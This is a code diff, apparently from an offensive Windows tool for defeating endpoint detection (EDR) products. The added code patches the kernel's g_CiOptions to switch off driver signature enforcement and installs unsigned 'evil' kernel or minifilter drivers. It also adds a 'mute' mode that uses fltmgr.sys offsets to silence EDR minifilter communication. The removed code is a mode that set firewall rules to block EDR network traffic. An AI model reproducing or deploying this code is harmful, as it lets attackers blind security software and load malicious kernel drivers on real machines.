+                                        _tprintf_or_not(TEXT("[!] If needed, you can manually stop : \ncmd /c fltmc unload %s\n"), unsignedMinifilterDriverName);
+                                    }
+                                    else if (fltLoadResult == 0x80070002) {
+                                        _tprintf_or_not(TEXT("[!] FilterLoad function failed (The system cannot find the driver file. Are you sure the \"%s\" driver is installed ?)\n"), unsignedMinifilterDriverName);
+                                    }
+                                    else if (fltLoadResult == 0x8007007F) {
+                                        // 0x8007007F ERROR_PROC_NOT_FOUND - The specified procedure could not be found.
+                                        _tprintf_or_not(TEXT("[!] FilterLoad function failed (ERROR_PROC_NOT_FOUND - The specified procedure could not be found.)\n"));
+                                    }
+                                    else if (fltLoadResult == 0x80070522) {
+                                        // 0x80070522 ERROR_PRIVILEGE_NOT_HELD - A required privilege is not held by the client.
+                                        _tprintf_or_not(TEXT("[!] FilterLoad function failed (ERROR_PRIVILEGE_NOT_HELD - A required privilege is not held by the client.)\n"));
+                                    }
+                                    else if (fltLoadResult == 0) {
+                                        _tprintf_or_not(TEXT("[+] Success !\n"));
+                                    }
+                                    else {
+                                        _tprintf_or_not(TEXT("[!] Failure !\n"));
+                                        if (verbose)
+                                            _tprintf_or_not(TEXT("[+] %s HRESULT is 0x%08X)\n"), unsignedMinifilterDriverName, fltLoadResult);
+                                    }
+                                }
+                                else if (isKernelDriver) {
+                                    // load KERNEL driver
+                                    if (_tcslen(unsignedDriverPath) == 0) {
+                                        PathAppend(unsignedDriverPath, currentFolderPath);
+                                        PathAppend(unsignedDriverPath, evilDriverDefaultName);
+                                    }
+                                    if (!FileExists(unsignedDriverPath)) {
+                                        _tprintf_or_not(TEXT("[!] Required driver file not present (default:%s). \n[!] Please specify the full path using the correct option\nExiting...\n"), unsignedDriverPath);
+                                        // Restore DSE status & exit
+                                        CiOptionsValue = OldCiOptionsValue;
+                                        patch_gCiOptions(g_CiOptionsAddress, CiOptionsValue, &OldCiOptionsValue);
+                                        return EXIT_FAILURE;
+                                    }
+                                    LPTSTR evilServiceNameIfAny = NULL;
+                                    BOOL isEvilDriverAlreadyRunning = IsDriverServiceRunning(unsignedDriverPath, &evilServiceNameIfAny);
+                                    if (isEvilDriverAlreadyRunning) {
+                                        _putts_or_not(TEXT("[!] Evil driver is already running!\n"));
+                                        SetEvilDriverServiceName(evilServiceNameIfAny);
+                                    }
+                                    else {
+                                        _putts_or_not(TEXT("[+] Installing unsigned driver file..."));
+                                        status = InstallEvilDriver(unsignedDriverPath);
+                                        if (status != TRUE)
+                                            _putts_or_not(TEXT("[!] An error occurred while installing the evil driver"));
+                                    }
+                                }
+                                else {
+                                    if (verbose)
+                                        _putts_or_not(TEXT("[-] Unknown driver type specified"));
+                                }
+                                // Restore DSE status
+                                CiOptionsValue = OldCiOptionsValue;
+                                patch_gCiOptions(g_CiOptionsAddress, CiOptionsValue, &OldCiOptionsValue);
+                            }
+                        }
+                    }
+                    break;
                 }
-                break;
+                // Disable EDR communication
+                case mute:
+                {
+                    CHAR fltMgrName[] = "FLTMGR.SYS";
+                    ULONG_PTR fltMgrBase = NULL;
+                    FindKernelModule(fltMgrName, &fltMgrBase);
+                    if (fltMgrBase == NULL) {
+                        _putts_or_not(TEXT("[-] The fltMgr base address is missing\n"));
+                        lpExitCode = EXIT_FAILURE;
+                    }
+                    else {
+                        if (verbose)
+                            printf("[+] fltMgrBase (%s) base address found : 0x%llx \n", fltMgrName, fltMgrBase);
+                        
+                        if (_tcslen(fltmgrOffsetCSVPath) == 0) {
+                            TCHAR CiOffsetCSVName[] = TEXT("\\FltmgrOffsets.csv");
+                            _tcsncat_s(fltmgrOffsetCSVPath, _countof(fltmgrOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
+                            _tcsncat_s(fltmgrOffsetCSVPath, _countof(fltmgrOffsetCSVPath), CiOffsetCSVName, _countof(CiOffsetCSVName));
+                        }
 
-            // Add firewall rules to block EDR network communications.
-            case firewall:
-            {
-                hrStatus = S_OK;
-                fwBlockingRulesList sFWEntries = { 0 };
-
-                _tprintf_or_not(TEXT("[*] Configuring Windows Firewall rules to block EDR network access...\n"));
-                hrStatus = FirewallBlockEDR(&sFWEntries);
-                if (FAILED(hrStatus)) {
-                    _tprintf_or_not(TEXT("[!] An error occured while attempting to create Firewall rules!\n"));
+                        if (FileExists(fltmgrOffsetCSVPath)) {
+                            LoadFltmgrOffsetsFromFile(fltmgrOffsetCSVPath);
+                            if (g_fltmgrOffsets.st.FltGlobalsOffset == 0x0   || g_fltmgrOffsets.st.FrameListOffset == 0x0     || 
+                                g_fltmgrOffsets.st.FrameList_rList == 0x0    || g_fltmgrOffsets.st.FrameLinks == 0x0          || 
+                                g_fltmgrOffsets.st.RegisteredFilters == 0x0  || g_fltmgrOffsets.st.FilterListHead == 0x0      ||
+                                g_fltmgrOffsets.st.FilterListCount == 0x0    || g_fltmgrOffsets.st.PrimaryLink == 0x0         ||
+                                g_fltmgrOffsets.st.ConnectionList == 0x0     || g_fltmgrOffsets.st.FilterName == 0x0          ||
+                                g_fltmgrOffsets.st.mList == 0x0              || g_fltmgrOffsets.st.mCount == 0x0              || 
+                                g_fltmgrOffsets.st.MaxConnections == 0x0     || g_fltmgrOffsets.st.NumberOfConnections == 0x0 ||
+                                g_fltmgrOffsets.st.srvPortCookie == 0x0      || g_fltmgrOffsets.st.ConnectNotify == 0x0       ||
+                                g_fltmgrOffsets.st.DisconnectNotify == 0x0   || g_fltmgrOffsets.st.MessageNotify == 0x0
+                                ) {
+                                _putts_or_not(TEXT("[!] One offsets of fltmgr.sys is null."));
+                                PrintFltOffsets();
+                                lpExitCode = EXIT_FAILURE;
+                            }
+                            else {
+                                if (verbose) {
+                                    PrintFltOffsets();
+                                }
+                                if (filter_index > 0) {
+                                    muteFilter(fltMgrBase, filter_index);
+                                }
+                                else {
+                                    _putts_or_not(TEXT("[!] You specfied a wrong --filter-index value (or didn't provide the option), mute operation won't occur !"));
+                                }
+                            }
+                        }
+                        else {
+                            _putts_or_not(TEXT("[-] Offsets are missing for the version of fltmgr.sys in use : the CSV file was not found !"));
+                            lpExitCode = EXIT_FAILURE;
+                        }
+                    }
+                    break;
+                // end of mute
                 }
-                else {
-                    _tprintf_or_not(TEXT("[+] Successfully configured Windows Firewall rules to block EDR network access!\n"));
+                // enumerate EDR communication
+                case fltkd_frames:
+                {
+                    CHAR fltMgrName[] = "FLTMGR.SYS";
+                    ULONG_PTR fltMgrBase = NULL;
+                    FindKernelModule(fltMgrName, &fltMgrBase);
+                    if (fltMgrBase == NULL) {
+                        _putts_or_not(TEXT("[-] The fltMgr base address is missing\n"));
+                        lpExitCode = EXIT_FAILURE;
+                    }
+                    else {
+                        if (verbose)
+                            printf("[+] fltMgrBase (%s) base address found : 0x%llx \n", fltMgrName, fltMgrBase);
 
+                        if (_tcslen(fltmgrOffsetCSVPath) == 0) {
+                            TCHAR CiOffsetCSVName[] = TEXT("\\FltmgrOffsets.csv");
+                            _tcsncat_s(fltmgrOffsetCSVPath, _countof(fltmgrOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
+                            _tcsncat_s(fltmgrOffsetCSVPath, _countof(fltmgrOffsetCSVPath), CiOffsetCSVName, _countof(CiOffsetCSVName));
+                        }
+
+                        if (FileExists(fltmgrOffsetCSVPath)) {
+                            LoadFltmgrOffsetsFromFile(fltmgrOffsetCSVPath);
+                            if (g_fltmgrOffsets.st.FltGlobalsOffset == 0x0 || g_fltmgrOffsets.st.FrameListOffset == 0x0 ||
+                                g_fltmgrOffsets.st.FrameList_rList == 0x0 || g_fltmgrOffsets.st.FrameLinks == 0x0 ||
+                                g_fltmgrOffsets.st.RegisteredFilters == 0x0 || g_fltmgrOffsets.st.FilterListHead == 0x0 ||
+                                g_fltmgrOffsets.st.FilterListCount == 0x0 || g_fltmgrOffsets.st.PrimaryLink == 0x0 ||
+                                g_fltmgrOffsets.st.ConnectionList == 0x0 || g_fltmgrOffsets.st.FilterName == 0x0 ||
+                                g_fltmgrOffsets.st.mList == 0x0 || g_fltmgrOffsets.st.mCount == 0x0 ||
+                                g_fltmgrOffsets.st.MaxConnections == 0x0 || g_fltmgrOffsets.st.NumberOfConnections == 0x0 ||
+                                g_fltmgrOffsets.st.srvPortCookie == 0x0 || g_fltmgrOffsets.st.ConnectNotify == 0x0 ||
+                                g_fltmgrOffsets.st.DisconnectNotify == 0x0 || g_fltmgrOffsets.st.MessageNotify == 0x0
+                                ) {
+                                _putts_or_not(TEXT("[!] One offsets of fltmgr.sys is null."));
+                                PrintFltOffsets();
+                                lpExitCode = EXIT_FAILURE;
+                            }
+                            else {
+                                if (verbose) {
+                                    PrintFltOffsets();
+                                }
+                                if (filter_index >= 0) {
+                                    printFltKdFrames(fltMgrBase, filter_index);
+                                }
+                                else {
+                                    _putts_or_not(TEXT("[!] You specfied a wrong --filter-index value (or didn't provide the option), details won't be displayed !"));
+                                    printFltKdFrames(fltMgrBase, 0);
+                                }
+                            }
+                        }
+                        else {
+                            _putts_or_not(TEXT("[-] Offsets are missing for the version of fltmgr.sys in use : the CSV file was not found !"));
+                            lpExitCode = EXIT_FAILURE;
+                        }
+                    }
+                    // end of fltkd_frames
                 }
-                _tprintf_or_not(TEXT("\n"));
-                FirewallPrintManualDeletion(&sFWEntries);
-                break;
-            }
+            // end of the startMode switch / case
             }
             _putts_or_not(TEXT(""));
         }
